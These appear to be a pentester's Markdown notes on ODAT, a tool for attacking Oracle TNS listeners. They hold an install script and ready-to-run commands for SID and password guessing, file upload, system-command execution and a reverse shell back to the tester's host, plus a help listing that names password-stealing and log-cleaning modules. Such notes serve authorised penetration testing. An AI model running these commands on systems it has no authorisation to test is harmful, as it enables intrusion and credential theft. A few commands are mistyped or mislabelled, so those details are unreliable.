# ODAT 


[Medium article by Mario Rufisanto on Oracle TNS Pentesting 2024](https://medium.com/fmisec/oracle-tns-penetration-test-using-odat-83fafcea1988) - 2024. Updated - removed `<>`
```bash
#!/bin/bash  
  
sudo apt-get install libaio1 python3-dev alien python3-pip -y  
git clone https://github.com/quentinhardy/odat.git  
cd odat/  
git submodule init  
git submodule update  
sudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y  
pip3 install cx_Oracle  
sudo apt-get install python3-scapy -y  
sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap  
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```

Useful commands - some commands **DO NOT AND WILL NOT EVER WORK**
```bash

# ./odat.py java !! does not work !!  
 
# Remember Odat is like impacket there are lots of tools
# Takes awhile and there are prompts
./odat.py all -s $ip

# service name guessing is required
./odat.py snguesser -s $ip
# SID Guess is required
./odat.py snguesser -s $ip

# this tool asks alot try a different tool for this
./odat.py passwordguesser -s $ip

# With valid credentials and permission you can upload a shell and execute it 
# Weirdly it has whitespace for the path then the file
./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password --getFile remotePath remoteFile localFile

./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password  --putFile remotePath remoteFile localFile

./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password ----removeFile remotePath remoteFile 

# This seems weird from an OPSEC, but this tool is from a different era
./odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U username -P password --test-module 

# Never managed to make work but SnowWight has it
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"

# Will prompt for a http server to serve reverse shell window and linux compatible
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --reverse-shell $localIP $port

For the archive just because 
```python
# Version 5.1.1 - 2022/04/27
./odat.py -h
	positional arguments:
  {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
                      
                      Choose a main command
    all               to run all modules in order to know what it is possible to do
    tnscmd            to communicate with the TNS listener
    tnspoison         to exploit TNS poisoning attack (SID required)
    sidguesser        to know valid SIDs
    snguesser         to know valid Service Name(s)
    passwordguesser   to know valid credentials
    utlhttp           to send HTTP requests or to scan ports
    httpuritype       to send HTTP requests or to scan ports
    utltcp            to scan ports
    ctxsys            to read files
    externaltable     to read files or to execute system commands/scripts
    dbmsxslprocessor  to upload files
    dbmsadvisor       to upload files
    utlfile           to download/upload/delete files
    dbmsscheduler     to execute system commands without a standard output
    java              to execute system commands
    passwordstealer   to get hashed Oracle passwords
    oradbg            to execute a bin or script
    dbmslob           to download files
    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
    smb               to capture the SMB authentication
    privesc           to gain elevated access
    cve               to exploit a CVE
    search            to search in databases, tables and columns
    unwrapper         to unwrap PL/SQL source code (no for 9i version)
    clean             clean traces and logs

options:
  -h, --help          show this help message and exit
  --version           show program's version number and exit

```
## References

[Medium article by Mario Rufisanto on Oracle TNS Pentesting 2024](https://medium.com/fmisec/oracle-tns-penetration-test-using-odat-83fafcea1988) 
[GitHub SnowWight hackdocs](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/1521-1522-1529-pentesting-oracle-listener/README.md)